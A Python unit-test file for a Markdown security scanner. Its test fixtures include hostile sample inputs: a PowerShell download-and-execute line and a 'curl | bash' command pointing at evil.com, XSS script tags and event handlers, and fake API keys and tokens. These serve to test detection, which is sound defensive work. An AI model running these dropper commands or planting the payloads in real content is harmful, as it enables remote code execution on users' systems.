#!/usr/bin/env python3
"""
Unit tests for the Markdown Security Scanner.

Run with:  python -m pytest tests/test_scanner.py -v
      or:  python tests/test_scanner.py
"""

import sys
import os
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from scanner import scan_file, Severity


def make_temp_md(content: str) -> str:
    f = tempfile.NamedTemporaryFile(mode="w", suffix=".md",
                                    delete=False, encoding="utf-8")
    f.write(content)
    f.close()
    return f.name


# ─── Hidden Comments ───────────────────────────────────────────────────────────

class TestHiddenComments(unittest.TestCase):

    def test_html_comment_detected(self):
        path = make_temp_md("# Title\n<!-- hidden message -->\nNormal text")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD001", ids)
        os.unlink(path)

    def test_zero_width_space_detected(self):
        path = make_temp_md("normal\u200btext")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD002", ids)
        os.unlink(path)

    def test_large_base64_detected(self):
        b64 = "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nIGJhc2U2NCBlbmNvZGVkIHN0cmluZw=="
        path = make_temp_md(f"Some text: {b64}")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD005", ids)
        os.unlink(path)


# ─── Malicious URLs ────────────────────────────────────────────────────────────

class TestMaliciousURLs(unittest.TestCase):

    def test_url_shortener_detected(self):
        path = make_temp_md("[Click me](https://bit.ly/abc123)")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD010", ids)
        os.unlink(path)

    def test_raw_ip_url_detected(self):
        path = make_temp_md("See http://192.168.1.1/malware.sh for details")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD011", ids)
        os.unlink(path)

    def test_javascript_uri_detected(self):
        path = make_temp_md("[Click](javascript:alert('xss'))")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD013", ids)
        os.unlink(path)

    def test_data_uri_detected(self):
        path = make_temp_md("![img](data:image/png;base64,abc123)")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD012", ids)
        os.unlink(path)


# ─── Script Injection ──────────────────────────────────────────────────────────

class TestScriptInjection(unittest.TestCase):

    def test_script_tag_detected(self):
        path = make_temp_md("<script>alert('xss')</script>")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD020", ids)
        os.unlink(path)

    def test_inline_event_handler_detected(self):
        path = make_temp_md('<img src="x" onerror="alert(1)">')
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD021", ids)
        os.unlink(path)

    def test_powershell_dropper_detected(self):
        payload = "powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com/drop.ps1')"
        path = make_temp_md(payload)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD023", ids)
        os.unlink(path)

    def test_curl_pipe_shell_detected(self):
        path = make_temp_md("curl https://evil.com/install.sh | bash")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD024", ids)
        os.unlink(path)


# ─── Credentials ──────────────────────────────────────────────────────────────

class TestCredentials(unittest.TestCase):

    def test_api_key_detected(self):
        path = make_temp_md("api_key = 'sk-abcdef1234567890abcdef1234567890'")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD030", ids)
        os.unlink(path)

    def test_aws_key_detected(self):
        path = make_temp_md("key: AKIAIOSFODNN7EXAMPLE")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD031", ids)
        os.unlink(path)

    def test_private_key_block_detected(self):
        path = make_temp_md("-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAK...\n-----END RSA PRIVATE KEY-----")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD032", ids)
        os.unlink(path)

    def test_github_token_detected(self):
        path = make_temp_md("token: ghp_abcdefghijklmnopqrstuvwxyz12345")
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD033", ids)
        os.unlink(path)


# ─── Code Block Awareness ─────────────────────────────────────────────────────

class TestCodeBlockAwareness(unittest.TestCase):
    """Rules with scan_code_blocks=False must NOT fire inside fenced/inline code."""

    def test_script_tag_in_fenced_block_ignored(self):
        content = "Here is an example:\n\n```html\n<script>alert('xss')</script>\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD020", ids, "MD020 should not fire inside a fenced code block")
        os.unlink(path)

    def test_curl_pipe_in_fenced_block_ignored(self):
        content = "Install with:\n\n```bash\ncurl https://evil.com/install.sh | bash\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD024", ids, "MD024 should not fire inside a fenced code block")
        os.unlink(path)

    def test_javascript_uri_in_fenced_block_ignored(self):
        content = "Example:\n\n```\n[link](javascript:void(0))\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD013", ids, "MD013 should not fire inside a fenced code block")
        os.unlink(path)

    def test_powershell_in_fenced_block_ignored(self):
        content = "Dropper example:\n\n```powershell\npowershell IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD023", ids, "MD023 should not fire inside a fenced code block")
        os.unlink(path)

    def test_credentials_fire_even_in_code_blocks(self):
        """Credentials are always flagged regardless of code block context."""
        content = "```\napi_key = 'sk-abcdef1234567890abcdef1234'\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD030", ids, "MD030 (hardcoded secret) must fire even in a code block")
        os.unlink(path)

    def test_aws_key_fires_even_in_code_blocks(self):
        content = "```\nkey: AKIAIOSFODNN7EXAMPLE\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD031", ids, "MD031 (AWS key) must fire even in a code block")
        os.unlink(path)

    def test_zero_width_char_fires_in_code_blocks(self):
        content = "```\nnormal\u200btext\n```\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD002", ids, "MD002 (zero-width char) must fire even in a code block")
        os.unlink(path)

    def test_inline_code_backtick_not_flagged_as_injection(self):
        """Inline code like `pip install my-project` must not trigger MD022."""
        content = "Install with `pip install my-project` and run it.\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD022", ids, "Inline code spans must not trigger MD022")
        os.unlink(path)


# ─── Ignore Directives ────────────────────────────────────────────────────────

class TestIgnoreDirectives(unittest.TestCase):

    def test_ignore_next_line_all_rules(self):
        content = "<!-- scanner-ignore -->\n<script>alert(1)</script>\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD020", ids, "scanner-ignore should suppress all rules on next line")
        os.unlink(path)

    def test_ignore_next_line_specific_rule(self):
        content = "<!-- scanner-ignore MD020 -->\n<script>alert(1)</script>\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD020", ids, "scanner-ignore MD020 should suppress MD020 on next line")
        os.unlink(path)

    def test_ignore_specific_rule_does_not_suppress_others(self):
        # Suppress MD020 but NOT MD013 — both patterns on same line
        content = "<!-- scanner-ignore MD020 -->\n<script>alert(1)</script> [x](javascript:void(0))\n"
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD020", ids)
        self.assertIn("MD013", ids, "Unsuppressed rule MD013 should still fire")
        os.unlink(path)

    def test_ignore_block(self):
        content = (
            "# Docs\n"
            "<!-- scanner-ignore-block -->\n"
            "<script>alert(1)</script>\n"
            "curl https://evil.com | bash\n"
            "<!-- scanner-ignore-end -->\n"
            "Normal line\n"
        )
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertNotIn("MD020", ids)
        self.assertNotIn("MD024", ids)
        os.unlink(path)

    def test_ignore_block_does_not_suppress_outside(self):
        content = (
            "<!-- scanner-ignore-block -->\n"
            "safe line\n"
            "<!-- scanner-ignore-end -->\n"
            "<script>alert(1)</script>\n"   # this should still be flagged
        )
        path = make_temp_md(content)
        ids = [f.rule_id for f in scan_file(path)]
        self.assertIn("MD020", ids, "Findings after ignore-end should still be reported")
        os.unlink(path)


# ─── Clean File & Severity Threshold ──────────────────────────────────────────

class TestCleanFile(unittest.TestCase):

    def test_clean_markdown_no_findings(self):
        content = """# My Project

Welcome to **My Project**. This is a clean README.

## Installation

```bash
pip install my-project
```

## Usage

```python
import my_project
my_project.run()
```

## License

MIT
"""
        path = make_temp_md(content)
        findings = scan_file(path, severity_threshold=Severity.LOW)
        self.assertEqual(findings, [], f"Expected no findings but got: {findings}")
        os.unlink(path)


class TestSeverityThreshold(unittest.TestCase):

    def test_low_threshold_returns_more_than_critical(self):
        path = make_temp_md("<!-- hidden --> normal text")
        findings_low = scan_file(path, severity_threshold=Severity.LOW)
        findings_critical = scan_file(path, severity_threshold=Severity.CRITICAL)
        self.assertGreaterEqual(len(findings_low), len(findings_critical))
        os.unlink(path)

    def test_critical_threshold_skips_medium(self):
        path = make_temp_md("<!-- plain html comment -->")
        ids = [f.rule_id for f in scan_file(path, severity_threshold=Severity.CRITICAL)]
        self.assertNotIn("MD001", ids, "MD001 is MEDIUM and should be skipped at CRITICAL threshold")
        os.unlink(path)


if __name__ == "__main__":
    unittest.main(verbosity=2)
